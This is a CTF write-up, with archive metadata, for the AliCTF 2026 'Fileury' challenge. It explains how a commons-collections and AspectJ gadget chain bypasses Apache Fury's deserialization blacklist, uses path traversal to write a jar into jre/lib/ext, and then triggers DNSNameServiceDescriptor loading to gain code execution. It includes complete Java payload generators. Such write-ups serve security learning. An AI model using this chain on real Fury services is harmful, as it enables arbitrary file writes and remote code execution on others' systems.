---
title: AliCTF 2026 SU WP - Fileury
contest: AliCTF
year: 2026
difficulty: hard
vuln_type: deserialize
tags:
- Apache Fury
- DisallowedList黑名单
- SimpleCache$StoreableCachingMap
- LazyMap
- TiedMapEntry
- TransformingComparator
- StringValueTransformer
- PriorityQueue
- writeToPath
- jre/lib/ext
- dnsns.jar
- DNSNameServiceDescriptor
- 二次反序列化
attack_chain:
- 'Apache Fury 黑名单: requireClassRegistration(false) 仍走 DisallowedList'
- com.feilong 缺失 → 无法用去年二次反序列化思路
- '未拦截: SimpleCache$StoreableCachingMap / LazyMap / TiedMapEntry / TransformingComparator / StringValueTransformer'
- PriorityQueue.readObject → heapify → comparator.compare
- TransformingComparator(StringValueTransformer).compare
- String.valueOf(TiedMapEntry) → toString → getValue
- LazyMap.get(key) → ConstantFactory.create 返回预设 byte[]
- StoreableCachingMap.put(key, value) → writeToPath 写文件
- 写入 jre/lib/ext/dnsns.jar 自动加载
- DNSNameServiceDescriptor 二次反序列化触发
key_payload: '''PriorityQueue + TransformingComparator(StringValueTransformer) + TiedMapEntry + LazyMap(StoreableCachingMap, ConstantFactory) + writeToPath / jre/lib/ext/dnsns.jar / DNSNameServiceDescriptor'''
one_liner: 'AliCTF 2026 Fileury — Apache Fury 黑名单 bypass: SimpleCache$StoreableCachingMap + LazyMap + TiedMapEntry + TransformingComparator(StringValueTransformer) 链写 jre/lib/ext/dnsns.jar 自动加载触发 DNSNameService 二次反序列化。'
lesson: Apache Fury 黑名单 checkNotInDisallowedList 只在序列化时走;LazyMap(StoreableCachingMap, ConstantFactory) 是新 gadget 链关键;jre/lib/ext 自动加载是经典文件写提权路径。
quality: high
full_path: AliCTF_2026_SU_WP.full.md
meta_path: AliCTF_2026_SU_WP.meta.md
images_removed: true
images_removed_count: 9
schema_version: v3.0.0-P0
summary: 'AliCTF 2026 SU WP - Fileury。AliCTF 2026 Fileury — Apache Fury 黑名单 bypass: SimpleCache$StoreableCachingMap + LazyMap + TiedMapEntry + TransformingComparator(StringValueTransformer) 链写 jre/lib/ext/dn...'
category: web
subcategory: deserialization
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 9
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/295357.html
reasoning_chain:
- '[触发点] Apache Fury 黑名单走了 DisallowedList → 假设：未签 com.feilong 没法用去年二次反序列化 / [假设] 需要找新 gadget 链 / [动作] 看 Fury 黑名单 fury/disallowed.txt 缺哪些关键类 / [观察] com.feilong 缺失，但 SimpleCache$StoreableCachingMap / LazyMap / TiedMapEntry / TransformingComparator 未拦截 / [下一步] 构造 commons-collections 链'
- '[触发点] TransformingComparator(StringValueTransformer) 可绕 → 假设：可触发 LazyMap.get 走 ConstantFactory → [假设] SimpleCache$StoreableCachingMap.put 写文件是 gadget / [动作] PriorityQueue → TransformingComparator(StringValueTransformer).compare → String.valueOf(TiedMapEntry) → toString → getValue / [观察] LazyMap.get(key) 触发 ConstantFactory.create 返回预设 byte[] / [下一步] 写 jre/lib/ext/dnsns.jar'
- '[触发点] jre/lib/ext 自动加载 jar → 假设：放个 jar 让 Java 启动时自动加载 / [动作] writeToPath 写 jre/lib/ext/dnsns.jar / [观察] 写入成功但还没有 RCE / [下一步] 利用 DNSNameServiceDescriptor 触发二次反序列化'
- '[触发点] DNSNameServiceDescriptor → 假设：触发另一个反序列化链 / [动作] 用 DNSNameServiceDescriptor 二次反序列化触发 RCE / [观察] RCE 成功拿 flag / [下一步]'
failed_attempts:
- 试图用 com.feilong 二次反序列化 → 失败：依赖缺失
- 试图用 TemplatesImpl 直接走链 → 失败：Fury 黑名单包含
key_observations:
- Apache Fury 黑名单 checkNotInDisallowedList 只在序列化时走
- LazyMap(StoreableCachingMap, ConstantFactory) 是新 gadget 链关键
- jre/lib/ext 自动加载是经典文件写提权路径
- DNSNameServiceDescriptor 是经典二次反序列化触发点
prerequisites:
- Apache Fury 序列化机制 + DisallowedList 黑名单原理
- commons-collections gadget 链（TiedMapEntry / LazyMap / TransformingComparator）
- Java 反序列化二次利用技巧
- JVM jre/lib/ext 自动加载机制
---
# AliCTF 2026 SU WP

> 原文: https://www.ctfiot.com/295357.html
> ID: 295357

Fileury

自 RCTF 一役沉寂许久，中间更是在 0CTF 被打得找不着北，未曾想今朝阿里云 CTF 竟让我寻回了用武之地。
话不多说，直接看题，题目使用 Apache Fury 进行反序列化，配置如下：

Fury fury = Fury.builder()
    .withLanguage(Language.JAVA)
    .requireClassRegistration(false)  // 允许反序列化未注册类
    .build();
Object obj = fury.deserialize(Base64.getDecoder().decode(input));

Fury 通过 fury/disallowed.txt 维护一份类黑名单，在反序列化时会检查类名是否在黑名单中。
黑名单检查逻辑 (DisallowedList.java):

static void checkNotInDisallowedList(String clsName) {
    if (DEFAULT_DISALLOWED_LIST_SET.contains(clsName)) {
        throw new InsecureException(String.format("%s hit disallowed list", clsName));
    }
}

黑名单包含了大部分常用反序列化 Gadget 类:
复盘去年 WP 发现，当前环境缺失了 com.feilong 依赖，导致二次反序列化绕过黑名单的方案失效，这也意味着挖掘新利用链

先分析一下黑名单，包含了大部分常用反序列化 Gadget 类:

未被拦截的关键类:

• org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap

• org.apache.commons.collections.map.LazyMap

• org.apache.commons.collections.keyvalue.TiedMapEntry

• org.apache.commons.collections.comparators.TransformingComparator

• org.apache.commons.collections.functors.ConstantFactory

• org.apache.commons.collections.functors.StringValueTransformer
起初试图复刻去年的思路挖掘二次反序列化，但此路俺没走通，失败了


```
Fury fury = Fury.builder()
    .withLanguage(Language.JAVA)
    .requireClassRegistration(false)  // 允许反序列化未注册类
    .build();
Object obj = fury.deserialize(Base64.getDecoder().decode(input));
static void checkNotInDisallowedList(String clsName) {
    if (DEFAULT_DISALLOWED_LIST_SET.contains(clsName)) {
        throw new InsecureException(String.format("%s hit disallowed list", clsName));
    }
}
HashSet.readObject()
    HashMap.put()
        HashMap.hash()
            TiedMapEntry.hashCode()
                TiedMapEntry.getValue()
                    LazyMap.get()
                        SimpleCache$StorableCachingMap.put()
                            SimpleCache$StorableCachingMap.writeToPath()
                                FileOutputStream.write()
package reproduce;

import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ConstantFactory;
import org.apache.commons.collections.functors.StringValueTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.fury.Fury;
import org.apache.fury.config.Language;

import java.io.FileOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class ExpAspectJ {

    public static void main(String[] args) throws Exception {
        // Goal: Arbitrary File Write
        // Chain:
        // PriorityQueue.readObject() -> heapify() -> comparator.compare()
        // comparator = TransformingComparator(StringValueTransformer)
        // transformer.transform(TiedMapEntry) -> TiedMapEntry.toString()
        // TiedMapEntry.toString() -> getValue() -> map.get(key)
        // map = LazyMap(StoreableCachingMap, ConstantFactory(bytes))
        // LazyMap.get(key) -> factory.create(key) -> bytes
        // LazyMap.put(key, bytes) -> StoreableCachingMap.put(key, bytes) -> write bytes to file 'key'
        byte[] content = Files.readAllBytes(Paths.get("dnsns.jar"));

        String filename = "../../../../../../../../../usr/local/openjdk-8/jre/lib/ext/dnsns.jar";
//        byte[] content = cronPayload.getBytes();

        // 1. Setup StoreableCachingMap (The Inner Map)
        // Ensure access to the class
        Class<?> scMapClass = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor<?> constructor = scMapClass.getDeclaredConstructor(String.class, int.class);
        constructor.setAccessible(true);
        // folder = ".", maxEntries = 100
        Map storeableMap = (Map) constructor.newInstance(".", 100);

        // 2. Setup LazyMap with ConstantFactory
        ConstantFactory factory = new ConstantFactory(content);
        Map lazyMap = LazyMap.decorate(storeableMap, factory);

        // 3. Setup TiedMapEntry
        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);

        // 4. Setup Comparator and Transformer
        // StringValueTransformer calls String.valueOf(obj) which calls obj.toString() (if not null)
        org.apache.commons.collections.Transformer transformer = StringValueTransformer.getInstance();
        TransformingComparator comparator = new TransformingComparator(transformer);

        // 5. Setup PriorityQueue
        PriorityQueue queue = new PriorityQueue(2, comparator);

        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        sizeField.set(queue, 2);

        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Object[] queueArray = new Object[2];
        queueArray[0] = entry;
        queueArray[1] = entry;
        queueField.set(queue, queueArray);

        // 6. Serialize with Fury
        System.out.println("Serializing AspectJ Chain with Fury...");
        Fury fury = Fury.builder().withLanguage(Language.JAVA).requireClassRegistration(false).build();
        byte[] serializedInfo = fury.serialize(queue);

        String b64 = Base64.getEncoder().encodeToString(serializedInfo);
        FileOutputStream fos = new FileOutputStream("payload_aj.b64");
        fos.write(b64.getBytes());
        fos.close();
        System.out.println("AspectJ Payload saved to payload_aj.b64");
    }
}
PriorityQueue.readObject()
  → heapify()
  → siftDown()
  → comparator.compare(queue[0], queue[1])
  → TransformingComparator.compare()
  → StringValueTransformer.transform(TiedMapEntry)
  → String.valueOf(TiedMapEntry)
  → TiedMapEntry.toString()
  → TiedMapEntry.getValue()
  → LazyMap.get(key)
  → factory.create()                    [ConstantFactory 返回预设的 byte[]]
  → StoreableCachingMap.put(key, value)
  → 写入文件 key，内容为 value
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$AbortPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$CallerRunsPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$DiscardOldestPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.ThreadPoolExecutor$DiscardPolicy from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.JBossExecutors$3 from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.NullRunnable from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.JBossExecutors$5 from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded java.lang.IllegalAccessError from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.LoggingUncaughtExceptionHandler from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.wildfly.common.cpu.ProcessorInfo from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded sun.nio.cs.US_ASCII$Decoder from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Version from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Messages from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Messages_$logger from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.StoppedExecutorException from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.EnhancedQueueExecutor$MBeanUnregisterAction from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.EnhancedQueueExecutor$MXBeanImpl from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded org.jboss.threads.Waiter from file:/app/app.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.atomic.Striped64 from /usr/local/openjdk-8/jre/lib/rt.jar]
2026-02-02 13:51:14 [Loaded java.util.concurrent.atomic.LongAdder from /usr/local/openjdk-8/jre/lib/rt.jar]
package reproduce;

import org.apache.fury.Fury;
import org.apache.fury.config.Language;
import java.io.FileOutputStream;
import java.util.Base64;

public class ExpDNS {
    public static void main(String[] args) throws Exception {
        System.out.println("Generating payload to load sun.net.spi.nameservice.dns.DNSNameServiceDescriptor...");

        Fury fury = Fury.builder()
                .withLanguage(Language.JAVA)
                .requireClassRegistration(false)
                .build();

        // Load the class via reflection to avoid compilation errors if access is restricted
        Class<?> clazz = Class.forName("sun.net.spi.nameservice.dns.DNSNameServiceDescriptor");
        Object instance = clazz.newInstance();

        byte[] payload = fury.serialize(instance);
        String b64 = Base64.getEncoder().encodeToString(payload);

        try (FileOutputStream fos = new FileOutputStream("payload_dns.b64")) {
            fos.write(b64.getBytes());
        }

        System.out.println("Payload saved to payload_dns.b64");
        System.out.println("Payload Base64: " + b64);
    }
}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]